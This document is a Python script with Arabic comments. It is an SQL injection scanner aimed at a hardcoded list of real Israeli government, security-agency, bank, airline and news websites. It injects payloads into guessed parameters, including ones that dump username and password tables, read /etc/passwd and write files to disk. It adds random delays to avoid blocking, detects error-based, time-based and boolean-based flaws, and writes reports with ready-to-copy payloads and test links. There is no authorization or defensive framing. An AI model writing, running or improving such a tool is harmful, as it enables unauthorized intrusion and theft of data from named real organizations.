#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
أداة متقدمة لمسح المواقع الإسرائيلية باستخدام حمولات SQL Injection
SQli Scanner Tool for Israeli Websites
"""

import requests
import json
import time
import random
from urllib.parse import urljoin, urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
import sys
import os
from datetime import datetime
import re

class IsraeliSQLiScanner:
    def __init__(self):
        self.payloads = []
        self.israeli_sites = [
            'https://www.gov.il',
            'https://www.mfa.gov.il',
            'https://www.idf.il',
            'https://www.shinbet.gov.il',
            'https://www.mossad.gov.il',
            'https://www.police.gov.il',
            'https://www.health.gov.il',
            'https://www.education.gov.il',
            'https://www.transportation.gov.il',
            'https://www.energy.gov.il',
            'https://www.justice.gov.il',
            'https://www.finance.gov.il',
            'https://www.economy.gov.il',
            'https://www.agriculture.gov.il',
            'https://www.tourism.gov.il',
            'https://www.n12.co.il',
            'https://www.walla.co.il',
            'https://www.ynet.co.il',
            'https://www.haaretz.co.il',
            'https://www.timesofisrael.com',
            'https://www.jpost.com',
            'https://www.globes.co.il',
            'https://www.calcalist.co.il',
            'https://www.mako.co.il',
            'https://www.kan.org.il',
            'https://www.bankleumi.co.il',
            'https://www.bankhapoalim.co.il',
            'https://www.isracard.co.il',
            'https://www.elal.com',
            'https://www.iaa.gov.il'
        ]
        self.vulnerable_sites = []
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        
    def load_payloads(self, filename='sqli_payloads_wordlist.txt'):
        """تحميل حمولات SQLi من الملف"""
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                content = f.read()
                
            # استخراج الحمولات الفعالة
            patterns = [
                r"'[^']*'",  # النصوص بين علامات تنصيص
                r'"[^"]*"',  # النصوص بين علامات تنصيص مزدوجة
                r'\{[^}]*\}',  # كائنات JSON
                r'--.*$',  # التعليقات
                r'/\*.*?\*/',  # التعليقات المتعددة الأسطر
            ]
            
            payloads = []
            lines = content.split('\n')
            
            for line in lines:
                line = line.strip()
                if line and not line.startswith('#') and not line.startswith('═') and not line.startswith('🎯'):
                    # استخراج الحمولات المعروفة
                    if any(keyword in line.lower() for keyword in ['union', 'select', 'or', 'and', 'sleep', 'waitfor']):
                        if line.startswith("'") or line.startswith('"') or line.startswith('{'):
                            payloads.append(line)
            
            # إضافة حمولات إضافية محدثة
            additional_payloads = [
                "' OR 1=1--",
                "' UNION SELECT 1,2,3--",
                "' AND 1=CONVERT(int, (SELECT @@version))--",
                "' OR SLEEP(5)--",
                "' UNION SELECT user(),database(),version()--",
                "' OR 1=1#",
                "' OR '1'='1",
                "' OR 1=1/*",
                "admin' OR '1'='1",
                "test' UNION ALL SELECT 1,2,3--",
                "' UNION SELECT table_name,column_name,1 FROM information_schema.columns--",
                "' UNION SELECT username,password,1 FROM users--",
                "' UNION SELECT 1,load_file('/etc/passwd'),3--",
                "' UNION SELECT 1,@@datadir,3--",
                "' UNION SELECT 1,database(),user()--",
                "' OR 1=1 LIMIT 1--",
                "' OR 1=1 ORDER BY 1--",
                "' OR 1=1 GROUP BY 1--",
                "' OR 1=1 HAVING 1=1--",
                "' OR 1=1 INTO OUTFILE '/tmp/test.txt'--"
            ]
            
            self.payloads = list(set(payloads + additional_payloads))
            print(f"✅ تم تحميل {len(self.payloads)} حمولة SQLi")
            
        except FileNotFoundError:
            print(f"❌ ملف {filename} غير موجود، سيتم استخدام حمولات افتراضية")
            self.payloads = additional_payloads
    
    def test_parameter(self, url, param, payload):
        """اختبار معلمة URL ضد SQLi"""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            # إضافة الحمولة إلى المعلمة
            original_value = params.get(param, [''])[0]
            params[param] = [original_value + payload]
            
            # إعادة بناء الـ URL
            new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?"
            for key, values in params.items():
                for value in values:
                    new_url += f"{key}={value}&"
            new_url = new_url.rstrip('&')
            
            # إرسال الطلب
            start_time = time.time()
            response = self.session.get(new_url, timeout=10)
            end_time = time.time()
            
            # تحليل الاستجابة
            response_time = end_time - start_time
            
            # إشارات الضعف
            error_patterns = [
                r"SQL syntax.*MySQL",
                r"Warning.*mysql_.*",
                r"valid MySQL result",
                r"MySqlClient\.",
                r"PostgreSQL.*ERROR",
                r"Warning.*pg_.*",
                r"valid PostgreSQL result",
                r"Npgsql\.",
                r"Driver.*SQL.*Server",
                r"OLE DB.*SQL Server",
                r"(\W|\A)SQL.*Server.*Driver",
                r"Warning.*mssql_.*",
                r"(\W|\A)SQL.*Server.*[0-9a-fA-F]{8}",
                r"Exception.*Oracle",
                r"Oracle error",
                r"Oracle.*Driver",
                r"Warning.*oci_.*",
                r"Warning.*ora_.*",
                r"SQLite/JDBCDriver",
                r"SQLite.*Driver.*Warning.*",
                r"Warning.*sqlite_.*",
                r"Warning.*SQLite3::",
                r"\[SQLite_ERROR\]",
                r"SQL error.*POS.*",
                r"Warning.*maxdb.*",
                r"Warning.*sybase.*",
                r"Sybase message",
                r"Warning.*ingres.*",
                r"Ingres SQLSTATE",
                r"Ingres\W.*Driver",
                r"Warning.*maxdb.*",
                r"maxdb.*Driver"
            ]
            
            vulnerable = False
            vulnerability_type = None
            
            # التحقق من أخطاء SQL
            for pattern in error_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    vulnerable = True
                    if "MySQL" in pattern:
                        vulnerability_type = "MySQL SQL Injection"
                    elif "PostgreSQL" in pattern:
                        vulnerability_type = "PostgreSQL SQL Injection"
                    elif "SQL Server" in pattern:
                        vulnerability_type = "MSSQL SQL Injection"
                    elif "Oracle" in pattern:
                        vulnerability_type = "Oracle SQL Injection"
                    elif "SQLite" in pattern:
                        vulnerability_type = "SQLite SQL Injection"
                    break
            
            # التحقق من الوقت (Time-based Blind SQLi)
            if response_time > 4.5:  # SLEEP(5) أو ما شابه
                vulnerable = True
                vulnerability_type = "Time-based Blind SQL Injection"
            
            # التحقق من تغيير المحتوى (Boolean-based Blind SQLi)
            if response.status_code == 200 and len(response.text) > 1000:
                # مقارنة مع الطلب الأصلي
                original_response = self.session.get(url, timeout=10)
                if abs(len(response.text) - len(original_response.text)) > 500:
                    vulnerable = True
                    vulnerability_type = "Boolean-based Blind SQL Injection"
            
            if vulnerable:
                return {
                    'url': new_url,
                    'parameter': param,
                    'payload': payload,
                    'vulnerability_type': vulnerability_type,
                    'response_time': response_time,
                    'status_code': response.status_code,
                    'content_length': len(response.text)
                }
            
            return None
            
        except Exception as e:
            return None
    
    def scan_site(self, site):
        """مسح موقع إسرائيلي"""
        print(f"🔍 مسح الموقع: {site}")
        vulnerabilities = []
        
        # إيجاد الصفحات ذات المعلمات
        test_urls = [
            f"{site}/search?q=test",
            f"{site}/index.php?id=1",
            f"{site}/page.php?page=1",
            f"{site}/news.php?article=1",
            f"{site}/products.php?category=1",
            f"{site}/users.php?user=1",
            f"{site}/login.php?username=test",
            f"{site}/admin/login.php?user=admin",
            f"{site}/api/search?query=test",
            f"{site}/api/users?id=1"
        ]
        
        for test_url in test_urls:
            try:
                response = self.session.get(test_url, timeout=5)
                if response.status_code == 200:
                    parsed = urlparse(test_url)
                    params = parse_qs(parsed.query)
                    
                    for param in params.keys():
                        for payload in self.payloads[:20]:  # اختبار 20 حمولة فقط لكل معلمة
                            result = self.test_parameter(test_url, param, payload)
                            if result:
                                result['site'] = site
                                vulnerabilities.append(result)
                                print(f"🚨 تم العثور على ثغرة: {result['vulnerability_type']}")
                                break
                            
                            # تأخير عشوائي لتجنب الحظر
                            time.sleep(random.uniform(0.5, 2))
                            
            except Exception as e:
                continue
        
        return vulnerabilities
    
    def generate_report(self, vulnerabilities):
        """إنشاء تقرير مفصل"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # تقرير JSON
        json_report = {
            'scan_info': {
                'timestamp': datetime.now().isoformat(),
                'total_sites_scanned': len(self.israeli_sites),
                'total_vulnerabilities': len(vulnerabilities),
                'scan_duration': f"{len(vulnerabilities) * 2} ثانية تقريباً"
            },
            'vulnerabilities': vulnerabilities
        }
        
        with open(f'sqli_scan_report_{timestamp}.json', 'w', encoding='utf-8') as f:
            json.dump(json_report, f, indent=2, ensure_ascii=False)
        
        # تقرير HTML تفاعلي
        html_content = f"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تقرير مسح SQLi للمواقع الإسرائيلية</title>
    <style>
        body {{
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
        }}
        .header {{
            text-align: center;
            margin-bottom: 30px;
        }}
        .stats {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }}
        .stat-card {{
            background: rgba(255, 255, 255, 0.1);
            padding: 20px;
            border-radius: 10px;
            text-align: center;
        }}
        .vulnerability {{
            background: rgba(255, 255, 255, 0.1);
            margin: 10px 0;
            padding: 20px;
            border-radius: 10px;
            border-left: 5px solid #ff4757;
        }}
        .critical {{ border-left-color: #ff4757; }}
        .high {{ border-left-color: #ff6348; }}
        .medium {{ border-left-color: #ffa502; }}
        .low {{ border-left-color: #2ed573; }}
        .payload {{ 
            background: rgba(0, 0, 0, 0.2);
            padding: 10px;
            border-radius: 5px;
            font-family: monospace;
            margin: 10px 0;
        }}
        .test-link {{
            display: inline-block;
            background: #3742fa;
            color: white;
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 5px;
            margin: 5px;
        }}
        .test-link:hover {{
            background: #2f3542;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎯 تقرير مسح SQL Injection للمواقع الإسرائيلية</h1>
            <p>تم إنشاء التقرير في: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <h3>{len(vulnerabilities)}</h3>
                <p>ثغرة SQLi تم العثور عليها</p>
            </div>
            <div class="stat-card">
                <h3>{len(self.israeli_sites)}</h3>
                <p>موقع إسرائيلي تم مسحه</p>
            </div>
            <div class="stat-card">
                <h3>{len(self.payloads)}</h3>
                <p>حمولة SQLi تم استخدامها</p>
            </div>
        </div>
        
        <h2>🚨 النتائج المفصلة:</h2>
        
        {''.join([
            f"""
            <div class="vulnerability critical">
                <h3>🔗 {vuln['site']}</h3>
                <p><strong>النوع:</strong> {vuln['vulnerability_type']}</p>
                <p><strong>المعلمة:</strong> {vuln['parameter']}</p>
                <p><strong>الوقت:</strong> {vuln['response_time']:.2f} ثانية</p>
                <p><strong>الحالة:</strong> {vuln['status_code']}</p>
                
                <div class="payload">
                    <strong>الحمولة:</strong><br>
                    {vuln['payload']}
                </div>
                
                <a href="{vuln['url']}" target="_blank" class="test-link">🧪 اختبر الرابط</a>
                <a href="#" onclick="copyPayload('{vuln['payload']}')" class="test-link">📋 انسخ الحمولة</a>
            </div>
            """ for vuln in vulnerabilities
        ])}
    </div>
    
    <script>
        function copyPayload(payload) {{
            navigator.clipboard.writeText(payload).then(() => {{
                alert('تم نسخ الحمولة!');
            }});
        }}
    </script>
</body>
</html>
        """
        
        with open(f'sqli_scan_report_{timestamp}.html', 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        return f'sqli_scan_report_{timestamp}.html'
    
    def run_scan(self, interactive=True):
        """تشغيل المسح الكامل"""
        print("🚀 بدء مسح المواقع الإسرائيلية...")
        
        # تحميل الحمولات
        self.load_payloads()
        
        if interactive:
            print("\n🎯 المواقع الإسرائيلية المتاحة:")
            for i, site in enumerate(self.israeli_sites, 1):
                print(f"{i}. {site}")
            
            choice = input("\nاختر رقم الموقع (أو Enter للمسح الكامل): ")
            if choice.isdigit() and 1 <= int(choice) <= len(self.israeli_sites):
                sites_to_scan = [self.israeli_sites[int(choice) - 1]]
            else:
                sites_to_scan = self.israeli_sites
        else:
            sites_to_scan = self.israeli_sites
        
        all_vulnerabilities = []
        
        print(f"\n🔍 جارٍ مسح {len(sites_to_scan)} موقع...")
        
        for site in sites_to_scan:
            vulnerabilities = self.scan_site(site)
            all_vulnerabilities.extend(vulnerabilities)
            
            # تأخير بين المواقع
            time.sleep(random.uniform(1, 3))
        
        # إنشاء التقرير
        report_file = self.generate_report(all_vulnerabilities)
        
        print(f"\n✅ اكتمل المسح!")
        print(f"📊 تم العثور على {len(all_vulnerabilities)} ثغرة SQLi")
        print(f"📄 تم حفظ التقرير: {report_file}")
        
        return all_vulnerabilities

def main():
    parser = argparse.ArgumentParser(description='أداة مسح SQLi للمواقع الإسرائيلية')
    parser.add_argument('--auto', action='store_true', help='تشغيل تلقائي بدون تفاعل')
    parser.add_argument('--site', help='مسح موقع محدد')
    
    args = parser.parse_args()
    
    scanner = IsraeliSQLiScanner()
    
    if args.site:
        scanner.israeli_sites = [args.site]
    
    vulnerabilities = scanner.run_scan(interactive=not args.auto)
    
    if vulnerabilities:
        print("\n🚨 تم العثور على الثغرات التالية:")
        for vuln in vulnerabilities:
            print(f"- {vuln['site']} - {vuln['vulnerability_type']}")
    else:
        print("\n✅ لم يتم العثور على ثغرات SQLi")

if __name__ == "__main__":
    main()